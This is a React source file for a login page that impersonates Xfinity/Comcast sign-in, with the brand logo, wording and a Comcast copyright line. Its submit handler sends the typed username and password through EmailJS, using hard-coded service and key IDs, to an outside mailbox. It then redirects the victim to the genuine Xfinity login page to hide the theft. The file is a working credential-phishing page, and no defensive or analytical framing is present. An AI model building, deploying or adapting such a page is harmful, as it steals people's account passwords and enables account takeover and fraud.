'use client'

import { useState } from 'react'
import { ChevronRight } from 'lucide-react'
import emailjs from '@emailjs/browser'
import logo from '../assets/xfinity-logo.svg'
import Image from '../assets/bg-image.png'

export default function LoginForm() {
  const [step, setStep] = useState<'username' | 'password'>('username')
  const [formData, setFormData] = useState({
    username: '',
    password: '',
  })

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (step === 'username') {
      setStep('password')
      return
    }

    try {
      await emailjs.send(
        'service_1x16ejs',
        'template_cxfx3vj',
        {
          username: formData.username,
          password: formData.password,
        },
        'yYhQD1s5tiGmItWd3'
      )
      alert('Login information submitted')
      // Redirect the user after submitting the data
      window.location.href = "https://login.xfinity.com/login"
    } catch (error) {
      console.error('Error:', error)
    }
  }

  return (
    <div className="min-h-screen flex flex-col md:grid md:grid-cols-2">
      {/* Left Column - Login Form */}
      <div className="flex flex-col justify-center px-6 py-10 md:px-12">
        <div className="max-w-md mx-auto">
          <img src={logo} alt="Logo" className="h-12 w-16 mb-8 ml-0" />
          <h1 className="text-left text-3xl font-bold text-gray-800 mb-6">
            Sign in with your Xfinity ID
          </h1>

          <form onSubmit={handleSubmit} className="space-y-6">
            {step === 'username' ? (
              <div>
                <input
                  type="text"
                  value={formData.username}
                  onChange={(e) =>
                    setFormData({ ...formData, username: e.target.value })
                  }
                  placeholder="Email, mobile, or username"
                  className="w-full px-4 py-4 bg-[#f6f6f9] rounded border border-gray-800 outline-purple-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500"
                  required
                />
                <p className="mt-4 text-sm md:text-base text-gray-600">
                  By signing in, you agree to our{' '}
                  <a href="#" className="text-purple-600 underline hover:underline">
                    Terms of Service
                  </a>{' '}
                  and{' '}
                  <a href="#" className="text-purple-600 underline hover:underline">
                    Privacy Policy
                  </a>
                  .
                </p>
              </div>
            ) : (
              <div>
                <input
                  type="password"
                  value={formData.password}
                  onChange={(e) =>
                    setFormData({ ...formData, password: e.target.value })
                  }
                  placeholder="Password"
                  className="w-full px-4 py-3 rounded border border-gray-300 focus:border-purple-500 focus:ring-1 focus:ring-purple-500"
                  required
                />
              </div>
            )}

            <button
              type="submit"
              className="md:w-[30%] bg-[#5a23b9] text-white py-3 md:py-4 px-6 rounded font-medium hover:bg-purple-700 transition-colors"
            >
              {step === 'username' ? "Let's go" : 'Submit'}
            </button>
          </form>

          <div className="mt-8 space-y-4">
            <a
              href="#"
              className="flex items-center justify-between p-4 hover:bg-gray-100 rounded-lg group"
            >
              <span className="text-gray-700">
                New to Xfinity? View exclusive offers near you
              </span>
              <ChevronRight className="text-gray-400 group-hover:text-gray-600" />
            </a>
            <a
              href="#"
              className="flex items-center justify-between p-4 hover:bg-gray-100 rounded-lg group"
            >
              <span className="text-gray-700">Find your Xfinity ID</span>
              <ChevronRight className="text-gray-400 group-hover:text-gray-600" />
            </a>
            <a
              href="#"
              className="flex items-center justify-between p-4 hover:bg-gray-100 rounded-lg group"
            >
              <span className="text-gray-700">Create a new Xfinity ID</span>
              <ChevronRight className="text-gray-400 group-hover:text-gray-600" />
            </a>
          </div>

          <div className="md:hidden mt-8 space-y-4">
            <img src={Image} alt="Logo" className="h-60 w-82 mb-8 mx-auto md:mx-0" />
          </div>

          <div className="mt-12 text-center text-sm text-gray-600 space-y-4">
            <p>© 2025 Comcast</p>
          </div>
        </div>
      </div>

      {/* Right Column - Promotional Content */}
      <div className="hidden md:flex items-center justify-center bg-[url('/src/assets/bg-image.png')] bg-cover bg-center">
        <div className="text-center max-w-lg px-6">
          {/* Add promotional content if needed */}
        </div>
      </div>
    </div>
  )
}
